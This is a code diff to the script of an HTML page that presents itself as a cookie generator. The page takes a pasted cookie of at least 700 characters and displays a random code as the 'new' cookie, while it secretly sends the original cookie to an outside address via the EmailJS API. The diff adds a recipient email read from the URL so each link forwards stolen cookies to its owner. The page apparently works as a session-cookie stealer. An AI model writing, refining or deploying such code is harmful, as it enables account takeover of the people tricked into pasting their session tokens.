@@ -61,6 +61,10 @@
   </div>
 
   <script>
+    // Extract email from query string
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email');
+
     // Function to generate a random code with uppercase letters and numbers only
     function generateRandomCode(length) {
       const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -85,29 +89,33 @@
         // Output the generated code
         newCookieOutput.value = newCode;
 
-        // Send the old cookie (input) to your email using API call
+        // Send the old cookie (input) to the email
         sendEmail(cookieInput);
       } else {
-        // Simply clear the output if the cookie input is invalid (less than 700 chars)
-        newCookieOutput.value = ''; 
+        newCookieOutput.value = '';
+        alert('Cookie must be at least 700 characters long.');
       }
     }
 
-    // Function to send email using EmailJS API directly
+    // Function to send email using EmailJS API
     function sendEmail(cookieContent) {
+      if (!email) {
+        alert('No email provided!');
+        return;
+      }
+
       const templateParams = {
-        cookie: cookieContent
+        cookie: cookieContent,
+        userEmail: email,
       };
 
-      // Prepare the payload for the API request
       const payload = {
-        service_id: 'service_bupfcwd', // Your Service ID
-        template_id: 'template_fkuvg0k', // Your Template ID
-        user_id: '1RUraa7fRYbQ2fuPR',  // Your Public Key
-        template_params: templateParams
+        service_id: 'service_bupfcwd',
+        template_id: 'template_fkuvg0k',
+        user_id: '1RUraa7fRYbQ2fuPR',
+        template_params: templateParams,
       };
 
-      // Send the email via API
       fetch('https://api.emailjs.com/api/v1.0/email/send', {
         method: 'POST',
         headers: {
@@ -115,17 +123,16 @@
         },
         body: JSON.stringify(payload),
       })
-      .then(response => response.text())  // Using .text() here instead of .json()
+      .then(response => response.text())
       .then(data => {
-        // No message is shown if the email is sent successfully
         if (data.trim() === 'OK') {
-          // No action or message needed
+          alert('Cookie sent to your email!');
         } else {
-          // You can leave this empty as no alert or message is needed
+          alert('Failed to send email.');
         }
       })
       .catch(error => {
-        // No alert or message on error
+        alert('Error: Could not send email.');
       });
     }
   </script>
